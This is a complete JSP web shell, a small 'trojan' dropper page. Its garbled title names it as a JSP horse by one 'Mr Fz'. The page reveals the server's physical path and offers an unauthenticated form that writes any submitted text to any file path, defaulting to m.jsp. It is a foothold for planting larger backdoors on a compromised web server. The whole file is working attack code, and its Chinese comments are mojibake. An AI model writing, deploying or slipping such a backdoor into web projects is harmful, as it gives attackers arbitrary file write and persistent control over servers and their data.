<%@ page language="java" pageEncoding="UTF-8"%>
<%@ page contentType="text/html;charset=UTF-8"%>
<%@ page import="java.io.*"%>
<html>
<head>
<title>jspå°é©¬ | Mr Fz'sä¸ªäººä¸ç!ä¸¥ç¦ç¨äºåä¸ç®ç!</title>
</head>
<body bgcolor="#ffffff">
<%
String damapath=request.getParameter("path");
String content=request.getParameter("content");
String url=request.getRequestURI();//å½åé¡µé¢ 
String url1=request.getRealPath(request.getServletPath());//å½åæ±è¯·çJSPæä»¶çç©çè·¯å¾
String dir=new File(url1).getParent(); //å½åJSPæä»¶æå¨ç®å½çç©çè·¯å¾
if(damapath!=null &&!damapath.equals("")&&content!=null&&!content.equals(""))
{
try{
File damafile=new File(damapath);//ç¨fileç±»åå»ºä¸ä¸ªdamafileå¯¹è±¡å¹¶æå®å®çè·¯å¾damapath
PrintWriter   pw=new PrintWriter(damafile);//ä½¿ç¨æå®æä»¶damafileåå»ºprintwriter
pw.println(content);//æå°content,å¹¶ç»æ­¢æå°
pw.close();//å³é­æµéæ¾èµæº
if(damafile.exists()&& damafile.length()>0)//å¤æ­damafileå¯¹è±¡æ¯å¦å­å¨,
{
   out.println("<font size=3 color=red>save ok!</font>");
}else
{
   out.println("<font size=3 color=red>save bad!</font>");
}
}catch (Exception ex){
   ex.printStackTrace();
}
}
out.println("<form action="+url+" method=post>");
out.println("<font size=2>è¯·è¾å¥ä¿å­è·¯å¾:</font><input type=text size=45 name=path value="+dir+"/m.jsp><br>");
out.println("<font size=2 color=red>å½åä½ æ±è¯·çJSPæä»¶çç©çè·¯å¾:"+url1+"</font><br>");
out.println("<textarea name=content rows=10 cols=50></textarea><br>");
out.println("<input type=submit value=save>");
out.println("</form>");
%>
</body>
</html>
